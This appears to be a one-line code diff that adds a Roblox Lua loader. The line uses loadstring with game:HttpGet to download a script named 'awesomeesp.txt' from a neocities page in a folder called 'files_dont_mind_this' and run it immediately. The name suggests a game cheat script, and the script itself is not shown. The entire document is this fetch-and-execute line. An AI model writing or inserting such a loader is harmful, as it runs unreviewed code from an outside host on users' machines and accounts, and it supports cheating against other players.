@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://zopium.neocities.org/files_dont_mind_this/awesomeesp.txt"))()
